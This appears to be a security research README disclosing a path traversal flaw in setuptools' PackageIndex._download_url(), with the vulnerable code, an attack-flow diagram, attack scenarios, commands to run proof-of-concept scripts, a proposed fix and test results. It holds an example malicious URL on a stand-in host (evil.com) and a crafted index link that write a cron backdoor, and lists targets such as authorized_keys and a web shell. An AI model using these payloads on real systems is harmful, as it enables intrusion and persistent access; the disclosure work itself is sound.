# Setuptools Path Traversal Vulnerability

Security research demonstrating a path traversal vulnerability in setuptools `package_index.py`.

## Vulnerability Summary

| Field | Value |
|-------|-------|
| **Affected Component** | `setuptools/package_index.py:810-823` |
| **Vulnerable Function** | `PackageIndex._download_url()` |
| **Vulnerability Type** | Path Traversal / Arbitrary File Write |
| **Attack Vector** | Malicious package index with URL-encoded absolute paths |
| **Affected Versions** | Tested on setuptools 78.1.0 (likely affects earlier versions) |

## Root Cause

The `_download_url()` function sanitizes `..` directory traversal sequences but does **not** check for absolute paths:

```python
# setuptools/package_index.py lines 810-823
def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')
    else:
        name = "__downloaded__"

    filename = os.path.join(tmpdir, name)  # VULNERABLE!
    # When name is "/etc/passwd", os.path.join() ignores tmpdir entirely
```

When `os.path.join(tmpdir, "/absolute/path")` is called, Python ignores the first argument and returns just the absolute path.

## Attack Flow

```
Malicious URL: http://evil.com/packages/%2Fetc%2Fcron.d%2Fbackdoor
                                        └──────────────────────────┘
                                        URL-encoded: /etc/cron.d/backdoor
                                                    ↓
                        egg_info_for_url() decodes to: "/etc/cron.d/backdoor"
                                                    ↓
                        os.path.join("/tmp/xyz", "/etc/cron.d/backdoor")
                                                    ↓
                                    Returns: "/etc/cron.d/backdoor"
                                                    ↓
                                File written OUTSIDE temp directory!
```

## Proof of Concept Files

| File | Description |
|------|-------------|
| `poc_path_traversal.py` | Simple PoC - writes to `/tmp/PROOF.txt` |
| `poc_direct_download.py` | Direct `_download_url()` exploit |
| `poc_realistic_attack.py` | Simulated malicious package index |
| `poc_full_easy_install.py` | Full easy_install attack chain |
| `malicious_index_server.py` | Standalone malicious PyPI server |
| `test_path_traversal_security.py` | 45 security test cases |

## Running the PoCs

```bash
# Simple proof - writes /tmp/PROOF.txt
python poc_path_traversal.py

# Direct function exploit - writes /tmp/CVE_PROOF.txt
python poc_direct_download.py

# Realistic attack simulation
python poc_realistic_attack.py

# Full easy_install simulation
python poc_full_easy_install.py
```

## Most Likely Attack Scenarios

### 1. Compromised Private Package Index (HIGH likelihood)

Many enterprises run internal PyPI mirrors (Artifactory, DevPI, Nexus). If compromised:

```bash
# Victim's pip.conf
[global]
index-url = https://pypi.internal.company.com/simple/

# Attacker serves malicious link:
# <a href="/%2Fetc%2Fcron.d%2Fbackdoor">requests-2.28.0.tar.gz</a>

# Victim updates packages normally:
pip install --upgrade requests
# Result: /etc/cron.d/backdoor written with attacker's payload
```

### 2. Dependency Confusion with Legacy Tools (MEDIUM-HIGH likelihood)

```python
# Attacker registers internal package name on public PyPI
# with malicious dependency_links

# Victim's legacy build system:
easy_install company-internal-utils
# or
python setup.py install

# Result: Arbitrary file written via path traversal
```

## Impact

An attacker could write files to arbitrary locations, including:

- `/etc/cron.d/backdoor` - Scheduled reverse shell
- `~/.ssh/authorized_keys` - SSH access
- `~/.bashrc` - Code execution on login
- `/var/www/html/shell.php` - Web shell

## Affected Code Paths

| Entry Point | Vulnerable? | Notes |
|-------------|-------------|-------|
| `PackageIndex._download_url()` | **YES** | Directly exploitable |
| `PackageIndex._download_other()` | **YES** | Calls `_download_url()` |
| `easy_install` | Potential | Uses PackageIndex |
| `pip install` | No | Uses own download mechanism |

## Recommended Fix

```python
def _download_url(self, url, tmpdir):
    name, _fragment = egg_info_for_url(url)
    if name:
        while '..' in name:
            name = name.replace('..', '.').replace('\\', '_')
        # FIX: Strip absolute path prefixes
        if os.path.isabs(name):
            name = name.lstrip('/\\')
        # FIX: Handle Windows drive letters
        if len(name) > 1 and name[1] == ':':
            name = name[0] + '_' + name[2:]
    else:
        name = "__downloaded__"

    filename = os.path.join(tmpdir, name)

    # FIX: Final validation
    if not os.path.realpath(filename).startswith(os.path.realpath(tmpdir) + os.sep):
        raise DistutilsError(f"Path escapes download directory: {filename}")

    return self._download_vcs(url, filename) or self._download_other(url, filename)
```

## Test Results

```
$ python -m pytest test_path_traversal_security.py -v
=================== 40 passed, 4 skipped, 1 xfailed ===================

- 40 tests document current vulnerable behavior
- 4 skipped (Windows-specific tests on Linux)
- 1 xfailed (will pass once vulnerability is fixed)
```

## Timeline

- **2025-01-31**: Vulnerability discovered and documented
- **Status**: Pending disclosure to setuptools maintainers

## Disclaimer

This research is for educational and authorized security testing purposes only. Do not use these techniques maliciously.

## References

- [setuptools GitHub](https://github.com/pypa/setuptools)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
